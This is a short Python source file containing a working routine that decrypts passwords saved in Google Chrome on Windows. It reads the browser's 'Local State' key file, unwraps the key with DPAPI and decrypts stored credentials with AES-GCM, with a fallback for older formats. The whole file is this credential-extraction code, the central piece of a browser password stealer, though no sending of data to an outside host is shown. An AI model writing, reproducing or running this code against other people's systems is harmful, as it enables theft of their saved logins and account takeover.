from win32.win32crypt import *
from DatabaseConnect import *
from Crypto.Cipher import AES
from json import *
import base64
import os
def decrypt_password(encryptedpass):
    path = r'%LocalAppData%\\Google\\Chrome\\User Data\\Local State'
    path = os.path.expandvars(path)
    encrypted_key = loads(open(path, 'r').read())['os_crypt']['encrypted_key']
    encrypted_key = base64.b64decode(encrypted_key)[5:]
    try:
        raw_pass = ""
        if encryptedpass[:3] == b"v10":
            b = encrypted_key
            decrypted_key = CryptUnprotectData(b, None, None, None, 0)[1]
            data = encryptedpass
            nonce = data[3:3+12]
            ciphertext = data[3+12:-16]
            tag = data[-16:]

            cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce=nonce)
            plaintext = cipher.decrypt_and_verify(ciphertext, tag)
            return plaintext            
        else:
            raw_pass = CryptUnprotectData(encryptedpass, None, None, None, 0)[1]
        return raw_pass
    except Exception as e:
        print(e)